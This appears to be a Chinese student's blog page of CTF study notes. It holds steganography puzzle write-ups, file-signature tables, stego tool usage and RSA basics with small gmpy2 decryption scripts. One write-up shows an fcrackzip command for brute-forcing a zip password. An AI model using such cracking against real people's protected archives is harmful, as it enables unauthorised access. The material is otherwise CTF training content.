<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  

  
  <title>Hexo</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta property="og:type" content="website">
<meta property="og:title" content="Hexo">
<meta property="og:url" content="http://ggken753.github.io/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="John Doe">
<meta name="twitter:card" content="summary">
  
    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.png">
  
  
    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
  
  
<link rel="stylesheet" href="/css/style.css">

<meta name="generator" content="Hexo 5.2.0"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">Hexo</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://GGken753.github.io"></form>
      </div>
    </div>
  </div>
</header>
      <div class="outer">
        <section id="main">
  
    <article id="post-学习笔记8" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/11/26/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B08/" class="article-date">
  <time datetime="2020-11-26T12:34:09.711Z" itemprop="datePublished">2020-11-26</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/11/26/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B08/">90道MISC部分</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="90道MISC部分wp"><a href="#90道MISC部分wp" class="headerlink" title="90道MISC部分wp"></a>90道MISC部分wp</h2><h4 id="bw-图片隐写-64"><a href="#bw-图片隐写-64" class="headerlink" title="bw-图片隐写-64"></a>bw-图片隐写-64</h4><p>1.首先将安装包解压，发现是一个gif,但打不开。猜想：是不是文件的格式出现了问题</p>
<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201126203907900.png"></p>
<p>2.将文件使用010软件打开，发现文件开头十六进制为</p>
<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201126204147474.png"></p>
<p>对比正确的gif的开头标志</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">47 49 46 38 39 61</span><br></pre></td></tr></table></figure>

<p>发现头文件格式错误，因此给他加上，在编译文本给它加上GIF89,保存</p>
<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201126204458751.png"></p>
<p>得到一个gif</p>
<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201126205200092.png"></p>
<p>3.接下来使用gif分帧找到小黄人出现的坐标</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">16 53 17 6 30 54 5 34 24 53 61 36 25 22 25 31 25 55 52</span><br></pre></td></tr></table></figure>

<p>在64进制表上进行匹配</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Q1RGe2FiY19kZWfZ30</span><br></pre></td></tr></table></figure>

<p>使用base64解码得到</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CTF&#123;abc_degٟ</span><br></pre></td></tr></table></figure>

<h4 id="bw-图片隐写-爱因斯坦"><a href="#bw-图片隐写-爱因斯坦" class="headerlink" title="bw-图片隐写-爱因斯坦"></a>bw-图片隐写-爱因斯坦</h4><p>1.将解压得到的misc2.jpg放入kail binwalk分离</p>
<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201127231030601.png"></p>
<p>得到一个包</p>
<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201127231050937.png"></p>
<p>解压得到另一个包</p>
<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201127231449902.png"></p>
<p>发现这个包解压需要密码，猜测为伪密码</p>
<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201127231356497.png"></p>
<p>然后对一开始的图片进行分析，查看属性</p>
<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201127231655958.png"></p>
<p>将这个输进去试试，得到flag.txt—-flag</p>
<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201127231833072.png"></p>
<h4 id="bw-图片隐写-0707"><a href="#bw-图片隐写-0707" class="headerlink" title="bw-图片隐写-0707"></a>bw-图片隐写-0707</h4><p>猜想：隐藏图片高度</p>
<p>1.解压放进010查看，看见这个照片是iphone5拍的</p>
<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201127232138312.png"></p>
<p>2.查看iphone5的后置摄像头为<strong>3264*2448</strong></p>
<p>而这个摄像头为<strong>3264*1681</strong>确实是隐藏了高度，改一下数据</p>
<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201127234429341.png"></p>
<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201127234826345.png"></p>
<p>得到flag</p>
<p><img src="C:\Users\ggken\Desktop\0707.png" alt="0707"></p>
<h4 id="bw-图片隐写-二维码"><a href="#bw-图片隐写-二维码" class="headerlink" title="bw-图片隐写-二维码"></a>bw-图片隐写-二维码</h4><p>得到一个二维码，扫进去是secret is here</p>
<p>1.放进binwalk去，得到一个安装包</p>
<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201128000237976.png"></p>
<p>在放进010</p>
<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201128000619629.png"></p>
<p>发现有一个文件，打开需要密码，用fcrackzip爆破</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fcrackzip -b -ca -l 1-4 -u 压缩文件</span><br></pre></td></tr></table></figure>

<p>-b 暴力破解模式 -c 指定掩码类型（a=a-z;1=0-9;!=特殊字符） -l 密码长度 -u 压缩文件名</p>
<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201128003451828.png"></p>
<p>输入7639得到flag</p>
<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201128003551689.png"></p>
<h4 id="bw-图片隐写-five"><a href="#bw-图片隐写-five" class="headerlink" title="bw-图片隐写-five"></a>bw-图片隐写-five</h4><p>1.解压得到一个图片，用010看发现还存在一张图</p>
<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201128100440622.png"></p>
<p>需要密码才能打开</p>
<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201128105419671.png"></p>
<p>用图片名称1111110000000000进行16进制转换得到FC00</p>
<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201128105754215.png"></p>
<p>打开后得到一个图片</p>
<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201128110132688.png"></p>
<p>2.用010打开这个照片，得到一个php语句，将它拿去base64解码</p>
<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201128110400349.png"></p>
<p>得到遗传莫斯密码</p>
<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201128110604614.png"></p>
<p>拿去解码</p>
<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201128110702183.png"></p>
<p>得到一串</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">7a57a5a743894a0e </span><br></pre></td></tr></table></figure>

<p>用MD5解码得到flag</p>
<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201128110904109.png"></p>
<h4 id="bw-图片隐写-fruit"><a href="#bw-图片隐写-fruit" class="headerlink" title="bw-图片隐写-fruit"></a>bw-图片隐写-fruit</h4><p>1.解压把图片放进stegsolve,按方向不断切换得到一个二维码</p>
<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201129102218308.png"></p>
<p>2.扫码得到</p>
<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201129102417671.png"></p>
<p>3.将数字转换成ASCII码后得到字符串</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-.-. - ..-. .-.. ... -... ..--.- -... ... .-..</span><br></pre></td></tr></table></figure>

<p>4.通过解莫斯密码，得到</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CTFLSB_BSL</span><br></pre></td></tr></table></figure>

<h4 id="bw-图片隐写-snake"><a href="#bw-图片隐写-snake" class="headerlink" title="bw-图片隐写-snake"></a>bw-图片隐写-snake</h4><p>1.将snake.jpg用010打开发现不是图片不是以FF D9结尾的。</p>
<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201129133753436.png"></p>
<p>2.拉进binwalk进行分离，得到两个文件</p>
<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201129133837760.png"></p>
<p>3.在key中发现</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">V2hhdCBpcyBOaWNraSBNaW5haidzIGZhdm9yaXRlIHNvbmcgdGhhdCByZWZlcnMgdG8gc25ha2VzPwo&#x3D;</span><br></pre></td></tr></table></figure>

<p>进行base64解码，得到</p>
<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201129133947628.png"></p>
<p>查看NiKi Minaj’的信息</p>
<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201129135038004.png"></p>
<p>4.cipher文件是加密的文件，用工具<a target="_blank" rel="noopener" href="http://serpent.online-domain-tools.com/%EF%BC%8C%E8%A7%A3%E7%A0%81%E5%BE%97%E5%88%B0flag">http://serpent.online-domain-tools.com/，解码得到flag</a></p>
<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201129135230957.png"></p>
<h4 id="bw-图片隐写-paint"><a href="#bw-图片隐写-paint" class="headerlink" title="bw-图片隐写-paint"></a>bw-图片隐写-paint</h4><p>1.解压文件是一个坐标文件，用gnuplot画图，得到二维码</p>
<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201129140915713.png"></p>
<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201129141310449.png"></p>
<h4 id="bw-图片隐写-教练我想打ctf"><a href="#bw-图片隐写-教练我想打ctf" class="headerlink" title="bw-图片隐写-教练我想打ctf"></a>bw-图片隐写-教练我想打ctf</h4><p>1.将图片放进stegSolve</p>
<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201201212402443.png"></p>
<p>save bin保存到桌面，并进行改后缀为 flag.zip</p>
<p>2.将保存的装包放进kail</p>
<p>用binwalk 分离得到文件 1</p>
<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201201212643786.png"></p>
<p>3.用010打开发现</p>
<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201201212816503.png"></p>
<h4 id="bw-图片隐写-九连环"><a href="#bw-图片隐写-九连环" class="headerlink" title="bw-图片隐写-九连环"></a>bw-图片隐写-九连环</h4><p>工具：steghide</p>
<p>使用方法：</p>
<p>*隐藏文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1. steghide embed -cf [图片文件载体] -ef [待隐藏文件]</span><br><span class="line">2. [回车]</span><br><span class="line">3. 输入密码，提取文件时用到，如果不想设密码，直接按回车</span><br><span class="line">4. [ENTER]</span><br></pre></td></tr></table></figure>

<p>*使用以下命令显示隐藏在文件中的信息</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">steghide info 文件名</span><br></pre></td></tr></table></figure>

<p>*提取隐藏的文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">steghide extract -sf 文件名</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201201163137910.png"></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://ggken753.github.io/2020/11/26/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B08/" data-id="cki71zk5k0000k0v3ecai4cyc" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-学习笔记7" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/11/25/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B07/" class="article-date">
  <time datetime="2020-11-25T08:20:44.808Z" itemprop="datePublished">2020-11-25</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/11/25/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B07/">MISC解题思路</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="借鉴于https-www-cnblogs-com-chenxs-p-11493898-html和https-www-cnblogs-com-NPFS-p-13383625-html大佬的介绍和解题思路"><a href="#借鉴于https-www-cnblogs-com-chenxs-p-11493898-html和https-www-cnblogs-com-NPFS-p-13383625-html大佬的介绍和解题思路" class="headerlink" title="//借鉴于https://www.cnblogs.com/-chenxs/p/11493898.html和https://www.cnblogs.com/NPFS/p/13383625.html大佬的介绍和解题思路"></a>//借鉴于<a target="_blank" rel="noopener" href="https://www.cnblogs.com/-chenxs/p/11493898.html%E5%92%8Chttps://www.cnblogs.com/NPFS/p/13383625.html%E5%A4%A7%E4%BD%AC%E7%9A%84%E4%BB%8B%E7%BB%8D%E5%92%8C%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF">https://www.cnblogs.com/-chenxs/p/11493898.html和https://www.cnblogs.com/NPFS/p/13383625.html大佬的介绍和解题思路</a></h2><h2 id="隐写术"><a href="#隐写术" class="headerlink" title="隐写术"></a>隐写术</h2><h3 id="图像隐写术进行数据隐写分为以下几类："><a href="#图像隐写术进行数据隐写分为以下几类：" class="headerlink" title="图像隐写术进行数据隐写分为以下几类："></a>图像隐写术进行数据隐写分为以下几类：</h3><ul>
<li>1.在图片右击查看属性，在详细信息中隐藏数据</li>
<li>2.将数据类型进行改写（rar或者zip数据改为jpg等格式）</li>
<li>3.根据各种类型图像的固定格式，隐藏数据</li>
<li>在编译器中修改图像开始的标志，改变其原来图像格式</li>
<li>在图像结束标志后加入数据</li>
<li>在图像数据中加入数据，不影响视觉效果情况下修改像素数据，加入信息</li>
<li>4.利用隐写算法将数据隐写到图片中而不影响图像（仅限于jpg图像） 隐写常用的算法有F5，guess jsteg jphide。</li>
</ul>
<h3 id="破解隐写术方法及步骤"><a href="#破解隐写术方法及步骤" class="headerlink" title="破解隐写术方法及步骤"></a>破解隐写术方法及步骤</h3><ul>
<li><p>1.查看图像属性详细信息是否有隐藏内容</p>
</li>
<li><p>2.利用winhex或nodepad++打开搜索ctf,CTF，flag,key等关键字是否存在相关信息</p>
</li>
<li><p>3.检查图像的开头标志和结束标志是否正确，若不正确修改图像标志恢复图像，打开查看是否有flag或ctf信息，（往往gif属于动图，需要分帧查看各帧图像组合所得数据 若不是直接的ctf或flag信息 需要考虑将其解码）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">- jpg图像开始标志：FF D8 结束标志 ：FF D9</span><br><span class="line">- gif图像开始标志：47 49 46 38 39 61 (GIF89)结束标志：01 01 00 3B</span><br><span class="line">- bmp图片开始标志：42 4D &#x2F;&#x2F;92 5B 54 00 00 00 00 00 结束标志：00</span><br><span class="line">- png图片开始标志：89 50 结束标志：60 82</span><br><span class="line">- TIFF (tif)开始标志：49 49 2A 00</span><br><span class="line">- Windows Bitmap (bmp)开始标志：42 4D</span><br><span class="line">- CAD (dwg)开始标志：41 43 31 30</span><br><span class="line">- Adobe Photoshop (psd)开始标志：38 42 50 53</span><br><span class="line">- Rich Text Format (rtf)开始标志：7B 5C 72 74 66</span><br><span class="line">- XML (xml)开始标志：3C 3F 78 6D 6C</span><br><span class="line">- HTML (html)开始标志：68 74 6D 6C 3E</span><br><span class="line">- Email [thorough only] (eml)开始标志：44 65 6C 69 76 65 72 79 2D 64 61 74 65 3A</span><br><span class="line">- Outlook Express (dbx)开始标志：CF AD 12 FE C5 FD 74 6F</span><br><span class="line">- Outlook (pst)开始标志：21 42 44 4E</span><br><span class="line">- MS Word&#x2F;Excel (xls.or.doc)开始标志：D0 CF 11 E0</span><br><span class="line">- MS Access (mdb)开始标志：53 74 61 6E 64 61 72 64 20 4A</span><br><span class="line">- WordPerfect (wpd)开始标志：FF 57 50 43</span><br><span class="line">- Postscript (eps.or.ps)开始标志：25 21 50 53 2D 41 64 6F 62 65</span><br><span class="line">- Adobe Acrobat (pdf)开始标志：25 50 44 46 2D 31 2E</span><br><span class="line">- Quicken (qdf)开始标志：AC 9E BD 8F</span><br><span class="line">- Windows Password (pwl)开始标志：E3 82 85 96</span><br><span class="line">- ZIP Archive (zip)开始标志：50 4B 03 04  结束标志：50 4B</span><br><span class="line">- RAR Archive (rar)开始标志：52 61 72 21</span><br><span class="line">- Wave (wav)开始标志：57 41 56 45</span><br><span class="line">- AVI (avi)开始标志：41 56 49 20</span><br><span class="line">- Real Audio (ram)开始标志：2E 72 61 FD</span><br><span class="line">- Real Media (rm)开始标志：2E 52 4D 46</span><br><span class="line">- MPEG (mpg)开始标志：00 00 01 BA</span><br><span class="line">- MPEG (mpg)开始标志：00 00 01 B3</span><br><span class="line">- Quicktime (mov)开始标志：6D 6F 6F 76</span><br><span class="line">- Windows Media (asf)开始标志：30 26 B2 75 8E 66 CF 11</span><br><span class="line">- MIDI (mid开始标志：4D 54 68 64</span><br></pre></td></tr></table></figure>



</li>
</ul>
<ul>
<li><p>4.将图片放置在kail系统中，执行binwalk xxx.jpg 查看图片中是否是多个图像组合或者包含其他文件（若存在多幅图像组合，再执行foremost xxx.jpg会自动分离；若检测出其他文件修改其后缀名即可，如zip）</p>
</li>
<li><p>5.使用StegSolve对图像进行分通道扫描，查看是否为LSB隐写</p>
</li>
<li><p>6.在kail下切换到F5-steganography，在java Extract运行</p>
</li>
<li><p>命令：java Extract 123456.jpg图片的绝对地址 -p 123456</p>
</li>
<li><p>判断是否为F5算法隐写</p>
</li>
<li><p>7.在kali系统中使用outguess-master工具（需要安装），检测是否为guess算法隐写</p>
</li>
</ul>
<h3 id="算法隐写的具体操作"><a href="#算法隐写的具体操作" class="headerlink" title="算法隐写的具体操作"></a>算法隐写的具体操作</h3><p>1.F5算法隐写</p>
<p>具体操作：在kail下切换到F5-steganography，在java Extract运行</p>
<p>命令：java Extract 123456.jpg图片的绝对地址 -p 123456</p>
<p>2.LSB算法隐写</p>
<p>具体操作：在Stegsolve.jar分析data Extract的red blue green</p>
<p>3.guess算法隐写</p>
<p>具体操作：在kail下切换到outguess目录下，直接用命令即可</p>
<p>命令:outguess -r /root/angrybird.jpg(绝对路径) 123.txt(信息存放的文本)</p>
<h3 id="工具使用"><a href="#工具使用" class="headerlink" title="工具使用"></a>工具使用</h3><h4 id="1-MP3stego"><a href="#1-MP3stego" class="headerlink" title="1.MP3stego"></a>1.MP3stego</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">encode -E hidden_text.txt -P pass svega.wavsvega_stego.mp3</span><br><span class="line"></span><br><span class="line">Decode.exe -X -P pass(密码) svega_stego.mp3(要拷贝到目录下) &#x2F;&#x2F;解码</span><br></pre></td></tr></table></figure>



<h4 id="2-stegdetect"><a href="#2-stegdetect" class="headerlink" title="2.stegdetect"></a>2.stegdetect</h4><p>Stegdetect可以检测到通过JSteg、JPHide、OutGuess、Invisible Secrets、F5、appendX和Camouflage等这些隐写工具隐藏的信息<br>s – 修改检测算法的敏感度，该值的默认值为1。检测结果的匹配度与检测算法的敏感度成正比，算法敏感度的值越大，检测出的可疑文件包含敏感信息的可能性越大。</p>
<p>d – 打印带行号的调试信息。</p>
<p>t – 设置要检测哪些隐写工具（默认检测jopi），可设置的选项如下：</p>
<p>j – 检测图像中的信息是否是用jsteg嵌入的。</p>
<p>o – 检测图像中的信息是否是用outguess嵌入的。</p>
<p>p – 检测图像中的信息是否是用jphide嵌入的。</p>
<p>i – 检测图像中的信息是否是用invisible secrets嵌入的。<br>命令：stegdetect.exe -tjopi -s10.0 xxx.jpg</p>
<p>音频：信息隐藏在声音里(逆序)，信息隐藏在数据里(分析音频数据) —-解题工具 Audition，Matlab</p>
<p>视频：信息隐藏在视频的某个或多个帧里  —解题工具 Premiere</p>
<p>文件隐写：把多个文件拼接成一个  —解题工具 binwalk</p>
<h2 id="加密题"><a href="#加密题" class="headerlink" title="加密题"></a>加密题</h2><h3 id="CTF中的RSA-算法"><a href="#CTF中的RSA-算法" class="headerlink" title="CTF中的RSA 算法"></a>CTF中的RSA 算法</h3><p>1.<strong>质数（素数)**是指在大于1的自然数中，除了1和它本身以外不再有其他因数的自然数。<br> 2.**合数</strong>是指比1大但不是素数的数<br> 3.<strong>约数（因数）</strong>整数a除以整数b(b≠0) 除得的商正好是整数而没有余数，我们就说a能被b整除，或b能整除a。a称为  b的倍数，b称为a的约数</p>
<p> 4.<strong>互质数</strong>：如果两个整数a,b的最大公因数（greatest common divisor）为1，即gcb(a,b)=1，那么称a,b两数互质<br> 5.<strong>欧拉函数</strong>是指设m为正整数，则1,2,3,4…….,m中与m互素的整数的个数记为φ(m)，叫做欧拉函</p>
<hr>
<h3 id="RSA加解密涉及变量"><a href="#RSA加解密涉及变量" class="headerlink" title="RSA加解密涉及变量"></a>RSA加解密涉及变量</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">N(n):模数（modulus）</span><br><span class="line"></span><br><span class="line">p 和 q ：N的两个因子（factor）</span><br><span class="line"></span><br><span class="line">e 和 d：(密钥) 互为模反数的两个指数（exponent）</span><br><span class="line"></span><br><span class="line">c 和 m：分别是密文和明文，这里一般指的是一个十进制的数还有一个就是n的欧拉函数值</span><br><span class="line"></span><br><span class="line">欧拉函数值：r</span><br><span class="line"></span><br><span class="line">pow(x, y, z)：效果等效pow(x, y)1 % z， 先计算x的y次方，如果存在另一个参数z，需要再对结果进行取模。</span><br></pre></td></tr></table></figure>

<hr>
<h3 id="RSA-密钥流程"><a href="#RSA-密钥流程" class="headerlink" title="RSA 密钥流程"></a>RSA 密钥流程</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">1.选择两个大的参数，计算出模数 N &#x3D; p * q</span><br><span class="line"></span><br><span class="line">2.计算欧拉函数 φ &#x3D; (p-1) * (q-1)，然后选择一个e(1&lt;e&lt;φ)，并且e和φ互质（互质：公约数只有1的两个整数）</span><br><span class="line"></span><br><span class="line">3.选一个整数e,满足条件1&lt;e&lt;φ(m),且gcd(φ(m),e)&#x3D;1。</span><br><span class="line"></span><br><span class="line">4.取e的模反数d，计算方法为:e * d ≡ 1 (mod φ) （模反元素：如果两个正整数e和n互质，那么一定可以找到整数d，使得 e * d - 1 被n整除，或者说e * d被n除的余数是1。这时，d就叫做e的“模反元素”。欧拉定理可以用来证明模反元素必然存在。两个整数a,b，它们除以整数M所得的余数相等：a ≡ b(mod m)，比如说5除3余数为2，11除3余数也为2，于是可写成11 ≡ 5(mod 3)。）</span><br><span class="line"></span><br><span class="line">5.对明文m进行加密：c &#x3D; pow(m, e, N),可以得到密文c。</span><br><span class="line"></span><br><span class="line">6.对密文c进行解密：m &#x3D; pow(c, d, N),可以得到明文m。</span><br><span class="line"></span><br><span class="line">7.以&#123;e,n&#125;为公开密钥，&#123;d,n&#125;为秘密密钥。</span><br></pre></td></tr></table></figure>

<p>​          <strong>对于RSA加密算法，公钥{e，n}为公钥，可以任意公开，破解RSA最直接（亦或是暴力）的方法就是分解整数N，然后计算欧拉函数φ(n)=(p-1) * (q-1),再通过d * e ≡ 1 mod φ(N)，即可计算出 d，然后就可以使用私钥{d,n}通过m =  pow(c,d,N)解密明文。</strong></p>
<h3 id="常见攻击方法"><a href="#常见攻击方法" class="headerlink" title="常见攻击方法"></a>常见攻击方法</h3><p><strong>已知<code>p</code>、<code>q</code>、<code>e</code>或者已知<code>n</code>、<code>e</code>求出<code>d</code></strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">p = gmpy2.mpz(<span class="number">18443</span>)<span class="comment">#初始化大整数</span></span><br><span class="line">q = gmpy2.mpz(<span class="number">49891</span>)</span><br><span class="line">e = gmpy2.mpz(<span class="number">19</span>)</span><br><span class="line">phi_n = (p<span class="number">-1</span>)*(q<span class="number">-1</span>)</span><br><span class="line">d = gmpy2.invert(e,phi_n)  <span class="comment"># invert（e，r）返回d使得e * d == 1 mod r，如果不存在d，则返回0</span></span><br><span class="line">print(<span class="string">&quot;p=&#123;0&#125;,q=&#123;1&#125;,e=&#123;2&#125;&quot;</span>.format(p,q,e))</span><br><span class="line">print(<span class="string">&quot;d is:\n%s&quot;</span>%d)</span><br></pre></td></tr></table></figure>



<p><strong>已经求出<code>d</code>、<code>n</code>、<code>c</code>，然后可以求出相应的明文m</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">#求明文</span><br><span class="line">import gmpy2</span><br><span class="line">n &#x3D; 920139713   #模数</span><br><span class="line">d &#x3D; 96849619    #密钥</span><br><span class="line">c &#x3D; &quot;&quot;&quot;</span><br><span class="line">704796792</span><br><span class="line">752211152</span><br><span class="line">274704164</span><br><span class="line">...  #密文</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">result &#x3D; &quot;&quot;</span><br><span class="line">c_list &#x3D; c.split()</span><br><span class="line">#print(c_list)</span><br><span class="line">for i in c_list:</span><br><span class="line">    result +&#x3D; chr(pow(int(i),d,n))</span><br><span class="line">print(result)</span><br></pre></td></tr></table></figure>

<p><strong>已知<code>c</code>、<code>e</code>、<code>n</code>求m</strong></p>
<p>结合以上两种方法，在知道<code>n</code>的前提下可求·<code>p</code>、<code>q</code>,利用<code>p</code>、<code>q</code>、<code>e</code>可以求出<code>d</code>，，从而因为已知<code>d</code>、<code>n</code>、<code>c</code>，求出相应的明文m</p>
<hr>
<p><strong>利用n的公约数</strong></p>
<p>当题目给出若干个模数n1,n2……,且模数很大。如果两次加密的<code>n1</code>和<code>n2</code>具有相同的素因子，那么我们可以利用<code>欧几里德算法</code>直接分解<code>n1</code>和<code>n2</code>.从而计算出两个<code>n</code>的最大公约数<code>p</code>：</p>
<blockquote>
<p>素因子的定义：对于一个数n来说，将它的因子拆到若干个素数相乘，这些素数被称为n的素因子。<br> 比如 12可以被拆为2 6<br> 6不是质数，可以继续拆为2*3<br> 所以最后12的素因子就是 2, 3（不计重复元素）</p>
</blockquote>
